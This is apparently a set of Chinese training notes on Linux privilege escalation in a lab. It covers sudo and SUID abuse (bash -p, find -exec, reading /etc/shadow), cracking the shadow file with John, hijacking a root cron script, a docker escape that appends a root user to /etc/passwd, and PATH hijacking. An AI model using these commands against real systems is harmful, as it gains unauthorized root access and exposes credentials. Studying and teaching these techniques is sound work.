[TOC]



# ==Linux系统提权实战==

教材内容

## 一、Linux系统提权建议工具

### 1、linux-exploit-suggester

https://github.com/mzet-/linux-exploit-suggester 可以根据当前系统内核及应用等，提出漏洞建议，并指出利用方式。

另外，建议进行安全检查或加固时，也使用本工具进行扫描确认是否存在严重的安全漏洞。

```shell
[root@mycentos linux-exploit-suggester-master]# ./linux-exploit-suggester.sh 

Available information:

Kernel version: 3.10.0
Architecture: x86_64
Distribution: RHEL
Distribution version: 7
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

81 kernel space exploits
49 user space exploits

Possible Exploits:

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
```

也可以使用 Nessus 进行登录后的扫描，获取更加准确全面的漏洞信息。

### 2、MSF 提权辅助模块

```
use post/multi/recon/local_exploit_suggester
```

searchsploit

```shell
# 查看漏洞详情
searchsploit -p id
# 移动漏洞到当前目录
searchsploit -m id
```

### 3、linux-smart-enumeration

https://github.com/diego-treitos/linux-smart-enumeration)

```shell
# 下载
wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh

curl "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -Lo lse.sh;chmod 700 lse.sh

# 运行
./lse.sh
```

### 信息收集

```shell
# 查看系统发行版本
hostname  系统主机名
lsb_release -a  发行版信息
cat /pro/version  内核信息
cat /etc/*-release  发行版信息
cat /etc/issue  发行版信息
cat /proc/cpuinfo  CPU信息
cat /proc/version 查看版本信息

# 查看内核版本信息
uname -a 打印所有可用的系统信息
uname -r  内核版本
uname -n  系统主机名
uname -m  查看系统内核架构（64/32）

# 查看环境信息
env 查看环境变量
netstat -lntp 查看所有监听端口
netstat -antp 查看所有已建立的连接
netstat -s 查看网络统计信息
iptales -L 查看防火墙设置
firewall-cmd --list-all 查看防火墙设置
route -n 查看路由表
w 查看活动用户
id [username] 查看指定用户信息
last 查看用户登录日志
cut -d: -f1 /etc/passwd 查看系统所有用户
cut -d: -f1 /etc/group 查看系统所有组
crontab -l 查看当前用户的计划任务
systemctl list-unit-files 列出所有服务
service --status-all 列出所有服务
systemctl list-units --type=service --state=running 列出已启动的服务
chkconfig --list 列出所有系统任务
chkconfig --list | grep on 列出所有启动的系统服务
echo $PATH 查看系统环境变量路径
```

## 二、SUDO提权

### 1、sudo漏洞提权

https://cloud.tencent.com/developer/article/1805860

```shell
[root@centsix ~]# sudoedit -s /
sudoedit: /: not a regular file
```

如果输出是类似这种结果，则说明可能存在SUDO漏洞，目前更多发现于Debian或Ubuntu中，CentOS目前测试并不存在此问题。

步骤：

（1）下载源码：https://github.com/blasty/CVE-2021-3156 http://github.com/stong/CVE-2021-3156

（2）以普通用户登录，调用make命令生成可执行文件

```shell
-bash-4.1$ ./sudo-hax-me-a-sandwich 0
** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **
*** glibc detected *** sudoedit: malloc(): memory corruption: 0x000055b4f8520d00 ***
```

### 2、sudoer提权

```
[root@mycentos ~]# useradd qiang
[root@mycentos ~]# passwd qiang
[root@mycentos ~]# su - qiang
[qiang@mycentos home]$ sudo -l
```

![image-20240923101500909](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240923101500909.png)

默认情况下，新添加的用户，不具有任何超级管理员的权限。

或直接运行：vi /etc/sudoers 编辑该配置文件，或使用visudo命令进行编辑。

```shell
# visudo    
最后一行添加：
qiang ALL=(ALL:ALL) NOPASSWD:ALL        用户qiang在任意主机上以任意用户和用户组的身份免密码执行任意命令 ALL:ALL 表示用户和组
qiang ALL=(root) NOPASSWD:/usr/bin/firewall-cmd         用户qiang在任意主机上以root身份免密执行firewall-cmd

$ sudo -l   查看当前用户的sudo权限
$ sudo command   此时可以执行任意root权限的命令
```

> 一旦通过任意手段，获取到一个普通用户权限的Shell，那么首先运行 sudo -l 查看是否有执行超级管理员命令的权限。

## 三、SUID命令提权

### 1、SUID的工作机制

Linux进程在运行的时候有以下三个UID：

Real UID：执行该进程的用户的UID。Real UID只用于标识用户，不用于权限检查。

Effective UID（EUID）：进程执行时生效的UID。在对访问目标进行操作时，系统会检查EUID是否有权限。一般情况下，Real UID与EUID相同，但在运行设置了SUID权限的程序时，进程的EUID会被设置为程序文件属主的UID。

Set UID：Set owner User ID up on execution，它允许用户执行的文件以该文件的拥有者的身份运行，也就是说可以越权执行命令。主要设置于 chmod 命令中第user第3位。

CentOS系统中存在可执行程序/bin/cat，属主属组均为root，任何用户对其都拥有执行权限。另外存在系统文件/etc/shadow，属主属组也都是root，不提供任何访问权限。

```
比如：
[qiang@mycentos opt]$ sudo cat /etc/passwd
[sudo] qiang 的密码：
qiang 不在 sudoers 文件中。此事将被报告。

此时添加：
qiang ALL=(ALL:ALL) NOPASSWD:ALL

就可以正常使用，这里只涉及到UID，EID，
一般可以使用setuid来改变EID

```

### 2、SUID应用举例

假设系统中存在一个普通用户，名为user1，UID和GID都是1000。该用户对/bin/cat具有执行权限，对/etc/shadow不具有任何权限。默认情况下，user1执行/bin/cat，系统会创建一个cat进程，进程的Real UID和Effective UID相同，都是运行该进程的user1用户的UID（1000）。cat进程访问/etc/shadow，由于进程的EUID不具备任何访问权限，所以系统会拒绝其访问目标。

为/bin/cat设置SUID权限之后，user1创建的cat进程的Effective UID自动被设置为/bin/cat文件的属主的UID值，也就是root的UID：0。这样该进程访问/etc/shadow时，虽然目标文件拒绝任何人访问，但是由于进程的Effective UID为0，具备超级用户权限，可以访问任意文件，所以就可以显示shadow文件的内容了。

如果某个设置了suid权限的程序运行后创建了shell，那么shell进程的EUID也会是这个程序文件属主的UID，也就是说，这是一个root shell。root shell中运行的程序的EUID也都是0，具备超级权限。

为可执行文件添加suid权限的目的是简化操作流程，让普通用户也能做一些高权限才能做的的工作。但是如果SUID配置不当，则很容易造成提权。

#### eg:

查看 `firewall-cmd` 命令权限

```
[root@mycentos home]# ll /usr/bin/firewall-cmd
-rwxr-xr-x. 1 root root 116200 4月  28 2021 /usr/bin/firewall-cmd
```

用户qiang执行 `sudo firewall-cmd --list-all`

```
[qiang@mycentos opt]$ sudo firewall-cmd --list-all
[sudo] qiang 的密码：
qiang 不在 sudoers 文件中。此事将被报告。
```

为 `firewall-cmd` 添加SUID权限

```
[root@mycentos home]# ll /usr/bin/firewall-cmd
-rwxr-xr-x. 1 root root 116200 4月  28 2021 /usr/bin/firewall-cmd
[root@mycentos home]# chmod u+s /usr/bin/firewall-cmd
您在 /var/spool/mail/root 中有新邮件
[root@mycentos home]# ll /usr/bin/firewall-cmd
-rwsr-xr-x. 1 root root 116200 4月  28 2021 /usr/bin/firewall-cmd
```

![image-20240923110239372](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240923110239372.png)

此时在 qiang 用户中发现 在该文件所有者处设置了 s 权限位

![image-20240923110405900](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240923110405900.png)

> “s” 代表 setuid 权限标志。当一个可执行文件设置了 setuid 权限后，该文件在执行时将以文件所有者的身份运行，而不是以执行该文件的用户的身份运行。

此时 qiang 用户执行 `firewall-cmd` 便是以 root 用户在执行

ok，是用不了，原来是 firewall-cmd 命令本身权限较高，同理上面的操作对 `/usr/bin/cat` 执行

![image-20240923112421171](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240923112421171.png)

然后 root 添加 s 权限

![image-20240923112506309](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240923112506309.png)

qiang 用户 再执行

![image-20240923112620492](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240923112620492.png)

就可以执行

### 3、为命令设置SUID权限

```shell
chmod u+s prog1  //设置prog1的suid权限
chmod g+s prog2  //设置prog2的sgid权限

find / -perm -u=s -type f 2>/dev/null  //查找suid文件
find / -perm -g=s -type f 2>/dev/null  //查找sgid文件
```

### 4、默认情况下的SUID权限

在本实验环境：CentOS（64位）版本中，默认的SUID权限有以下一些命令

使用 `find / -perm -u=s` 进行查看

```shell
/usr/libexec/pt_chown
/usr/libexec/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/crontab
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chage
/usr/bin/sudo
/usr/sbin/usernetctl
/bin/ping
/bin/ping6
/bin/mount
/bin/su
/bin/umount
/bin/fusermount
/sbin/pam_timestamp_check
/sbin/unix_chkpwd
```

既然这些命令被赋予了 s 权限，那么也就意味着上述命令并不存在问题。

### 5、为以下命令授予SUID权限

如果root管理为以下命令授予了SUID权限，那么则可能导致问题，比如：

```shell
chmod u+s /bin/bash            执行 bash -p
chmod u+s /bin/sh            执行 sh -p
chmod u+s /bin/env            执行 env /bin/sh -p
chmod u+s /bin/vi            $ vi /etc/shadow
chmod u+s /bin/awk            $ awk '{print $0}' /etc/shadow
chmod u+s /bin/cat            $ cat /etc/shadow
chmod u+s /usr/bin/curl        $ curl file:///etc/shadow
chmod u+s /bin/find            $ find /etc/passwd -exec cat /etc/shadow \;                              
							$ find /etc/passwd -exec bash -p \;  # 如果 find 具有 s 权限，执行这句话可以直接进入 root shell
```

获取到/etc/shadow密码文件后，与/etc/passwd共同生成一个新的合并文件，如pwjohn，再使用john进行爆破。

```shell
┌──(root@kaliQiang)-[/home/denny/johns]
└─# unshadow passwd shadow > pwjohn

┌──(root@kaliQiang)-[/home/denny/johns]
└─# john --wordlist=../password-3000.txt pwjohn
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type insteadUsing default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456           (qiang)
admin123         (root)
2g 0:00:00:00 DONE (2021-12-05 00:56) 4.166g/s 4266p/s 5333c/s 5333C/s 19861114..831211
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

此处使用了系统密码爆破工具：John，并且默认情况下，John会在当前用户的主目录下生成一个.john的隐藏文件，里面保存着每一次破解成功后的数据，可以使用 ./john —show pwjohn 进行显示，也可以将其删除，从头开始破解。

```shell
┌──(root@kaliQiang)-[/home/denny/johns]
└─# john --show pwjohn                         root:admin123:0:0:root:/root:/bin/bash
qiang:123456:500:500::/home/qiang:/bin/bash
```

#### eg:比如此时 cat 具有 s 权限

![image-20240923143221052](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240923143221052.png)

用户 qiang 执行 `find / -perm -u=s 2> /dev/nunll`

![image-20240923143427637](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240923143427637.png)

然后用户 qiang 发现 cat 竟然具有 s 权限

然后执行

```
cat /etc/shadow
cat /etc/passwd
```

复制该文件内容到 kali

![image-20240923144419129](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240923144419129.png)

然后执行 john的指令

```
mkdir johns
unshadow /opt/passwd /opt/shadow > myshadow

#/opt/passwd 和 /opt/shadow 两个文件的顺序不能变，先是passwd再是shadow
```

![image-20240923144904873](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240923144904873.png)

此时可以使用 john 进行爆破

```
john myshadow

#使用john默认字典进行爆破
```

![image-20240923145444258](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240923145444258.png)

```
john --wordlist=../password.txt ./myshadow

#参数 --wordlist 用来指定 爆破字典
```

![image-20240923150259615](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240923150259615.png)

> ```
> john --show myshadow
> ```
>
> 可以查看 已经爆破出来的密码
>
> 爆破结果存在于 /root/.john/ 目录下的 pot 文件中
>
> ![image-20240923151107156](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240923151107156.png)

## 四、Cron定时任务

> **一、基本格式**
>
> ```plaintext
> * * * * * command to be executed
> ```
>
> 1. 分、时、日、月、周五个时间字段，分别用空格隔开。
>    - 分钟（minute）：取值范围是 0 - 59。
>    - 小时（hour）：取值范围是 0 - 23。
>    - 日（day of month）：取值范围是 1 - 31。
>    - 月（month）：取值范围是 1 - 12。
>    - 周（day of week）：取值范围是 0 - 7（0 和 7 都代表星期日）。
> 2. command to be executed：要执行的命令或脚本。
>
> **二、时间字段的特殊符号含义**
>
> 1. `*`（星号）：
>    - 代表所有可能的值。例如，在分钟字段中使用 “*” 表示每分钟都执行任务。
> 2. `,`（逗号）：
>    - 用于分隔多个值。例如，“1,3,5” 表示在对应的时间字段中，当值为 1、3 或 5 时执行任务。
> 3. `-`（连字符）：
>    - 表示一个范围。例如，“1-5” 表示在对应的时间字段中，从 1 到 5 的值都满足条件。
> 4. `/`（斜杠）：
>    - 用于指定时间间隔。例如，“*/5” 表示每隔 5 个单位执行任务。在分钟字段中，“*/5” 表示每 5 分钟执行一次任务。
>
> **三、举例**
>
> 1. 每天凌晨 2 点执行一个脚本：
>    - `0 2 * * * /path/to/script.sh`
> 2. 每周一到周五的上午 9 点执行任务：
>    - `0 9 * * 1-5 command`
> 3. 每隔 10 分钟执行一次任务：
>    - `*/10 * * * * command`
>
> **四、使用 crontab 的步骤**
>
> 1. 编辑任务：
>    - 使用 `crontab -e` 命令打开 crontab 编辑器。在编辑器中按照语法规则输入定时任务。
> 2. 查看任务：
>    - 使用 `crontab -l` 命令可以列出当前用户的所有定时任务。
> 3. 删除任务：
>    - 如果要删除某个定时任务，可以再次使用 `crontab -e` 进入编辑模式，删除对应的任务行，然后保存退出。
>
> 注意，在设置 crontab 任务时，要确保命令或脚本的路径正确，并且执行任务的用户具有足够的权限来运行相应的命令或脚本。同时，对于复杂的任务，可以先在命令行中测试命令或脚本是否能够正常运行，然后再添加到 crontab 中。

如果可以找到可以有权限修改的计划任务脚本，就可以修改脚本实现提权。本质上，就是文件权限配置不当。

crontab -l 或 cat /var/spool/cron/root

```shell
*/1 * * * * /opt/learn/site_check.sh

#表示每分钟 运行一次该脚本
```

修改：site_check.sh的内容如下：

```shell
curl http://192.168.230.147/dashboard/phpinfo.php > /dev/null
if [ $? -ne 0 ]; then    
	/opt/lampp/lampp start    
	echo "检测到lampp没有启动，已经完成启动 - "`date "+%Y-%m-%d %H:%M:%S"` >> /opt/learn/site_check.log
fi
chmod u+s /bin/bash
firewall-cmd --list-port | grep 80
if [ $? -ne 0 ]; then    
	firewall-cmd --add-port=80/tcp    
	echo "检测到80端口没有通过，已经完成添加 - "`date "+%Y-%m-%d %H:%M:%S"` >> /opt/learn/site_check.log
fi
```

基本原理非常简单，就是借助于root用户的定时任务，去修改其运行的脚本，为关键命令授权 SUID 权限，前提是普通用户可以直接修改root用户的定时任务的脚本，通常这是由于管理员的疏忽造成的。

> 核心在于让root用户能够通过定时任务去执行某条指令，那么如果不是定时任务，而是其他方式来执行指令，效果是一样的。

#### eg:

![image-20240923172746868](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240923172746868.png)

该目录下创建该文件

然后 root 用户添加 crontab 定时任务

```
crontab -e

#将以下内容添加在定时任务中
*/1 * * * * /opt/learn/site_check.sh
```

如果此时 用户 qiang 直接编辑 /opt/learn/site_check.sh 文件，在其中添加 `chmod u+s /bin/bash`

当 root 的 crontab 执行之后 就相当于 root 执行了一遍 `chmod u+s /bin/bash` ，此时 qiang 执行 `bash -p` 就可以直接进入 root 的 shell

![image-20240923174217663](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240923174217663.png)

当然，前提是 qiang 对 crontab 中的定时任务的脚本具有写权限

## 五、docker提权

查看是否有docker组 -> 查看当前获取到的普通用户是否在docker组里面 -> 如果在，创建一个容器，并把etc目录挂载到宿主机的etc目录 -> 修改/etc/passwd中的普通用户id为0

```shell
cat /etc/group | grep docker

# 把容器目录挂载到用户的目录（特权模式）
docker run -it --privileged=true -v /etc:/etc [image_id] /bin/sh

# 修改passwd文件，如增加一个用户（密码为：password@123)
echo "test:advwtv/9yU5yQ:0:0:,,,:/root:/bin/bash" >>/etc/passwd
```

## 六、环境变量提权

### 1、开发一段C程序并运行

```c
#include <unistd.h>
int main() {  
    setuid(0);  
    setgid(0);  
    system("cat /etc/passwd");  
    return 0;
}
```

使用命令：`gcc suider.c -o suider` 编译，并执行，可以正常输出 /etc/passwd 的值。

### 2、为suid程序授权SUID权限

```shell
# chmod u+s ./suider
```

### 3、普通用户进入/tmp目录

```shell
$ cd /tmp
$ echo /bin/bash > /tmp/cat
$ chmod 777 /tmp/cat
$ export PATH=/tmp:$PATH
$ ./suider
[root@centqiang tmp]#
```

#### Linux Polkit本地权限提升漏洞（CVE-2021-4034）

https://blog.csdn.net/WWL0814/article/details/122716367

#### CVE-2022-23222-linux内核提权漏洞（eBPF提权）

https://segmentfault.com/a/1190000042038200 （较多版本不能使用）

#### CVE-2022-0847-Linux内核提权漏洞（Dirty Pipe脏管道）

https://blog.csdn.net/qq_49091880/article/details/124116262

#### 七、Linux权限维持

权限维持的核心：植入后门程序或木马，在特定条件下能够自动触发（比如定时任务，用户操作等）

https://blog.csdn.net/weixin_51353029/article/details/120957606

![image-20221222093109405](https://gitee.com/ymq_typroa/typroa/raw/main/20221222093109.png)